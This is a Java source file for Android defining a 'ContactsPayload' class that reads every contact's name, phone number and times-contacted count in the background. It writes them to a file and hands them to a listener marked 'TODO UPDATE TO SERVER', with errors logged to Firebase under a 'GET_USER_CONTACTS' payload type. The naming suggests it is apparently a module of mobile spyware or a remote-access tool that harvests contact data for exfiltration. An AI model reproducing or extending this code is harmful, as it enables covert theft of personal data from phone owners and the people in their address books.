package com.aigs.serviceone.payload;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

import com.aigs.serviceone.helpers.ContactsPayloadListner;
import com.aigs.serviceone.helpers.FileSystem;
import com.aigs.serviceone.annotations.PayloadTypes;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.lang.ref.WeakReference;
import java.util.HashSet;

public class ContactsPayload extends AsyncTask<String, String, Integer> {

    private final WeakReference<Context> context;
    private ContactsPayloadListner contactsPayloadListner;

    public ContactsPayload(Context context) {
        this.context = new WeakReference<>(context);
    }

    private static final String[] PROJECTION = new String[]{
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
    };

    public ContactsPayload setOnContactPayloadListener(ContactsPayloadListner contactsPayloadListner){
        this.contactsPayloadListner = contactsPayloadListner;
        return this;
    }
    @Override
    protected Integer doInBackground(String... strings) {
        try {

            ContentResolver cr = context.get().getContentResolver();

            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (cursor != null) {
                HashSet<String> mobileNoSet = new HashSet<>();
                try {
                    final int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                    final int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    final int timesContactedIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED);

                    String name, number, times_called;
                    JSONArray jsonArray = new JSONArray();
                    while (cursor.moveToNext()) {
                        JSONObject jsonObject = new JSONObject();
                        name = cursor.getString(nameIndex);
                        number = cursor.getString(numberIndex);
                        times_called = cursor.getString(timesContactedIndex);
                        number = number.replace(" ", "");
                        if (!mobileNoSet.contains(number)) {
                            // contactList.add(new Contact(name, number));
                            //TODO UPDATE TO SERVER
                            jsonObject.put("NAME",name);
                            jsonObject.put("NUMBER",number);
                            jsonObject.put("TIMES_CALLED",times_called);

                            jsonArray.put(jsonObject);

                            mobileNoSet.add(number);
                            Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
                                    + " No = " + number + " Contacted " + times_called + " Times");
                        }
                    }

                    File file = FileSystem.createInstance(context.get()).writeContactsData(jsonArray.toString());
                    contactsPayloadListner.onDataExtracted(file,jsonArray.toString());

                } finally {
                    cursor.close();
                }
            }
        } catch (Exception e) {
            Log.e("ERROR_CON : ", e.getMessage());
            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_USER_CONTACTS+"").child("CurrentLog").setValue(e.getMessage());
        }

        return null;
    }
}
